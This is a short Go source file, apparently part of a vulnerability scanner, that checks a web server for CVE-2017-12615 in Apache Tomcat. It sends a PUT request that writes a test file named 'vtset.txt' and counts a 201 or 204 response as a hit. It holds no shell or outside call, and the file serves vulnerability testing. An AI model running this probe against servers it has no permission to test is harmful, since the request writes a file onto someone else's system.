package tomcat

import "github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"

func CVE_2017_12615(url string, client *httpx.Client) bool {
	if req, err := client.Request(url+"/vtset.txt", "PUT", "test", nil, "Poc Tomcat"); err == nil {
		if req.StatusCode == 204 || req.StatusCode == 201 {
			return true
		}
	}
	return false
}
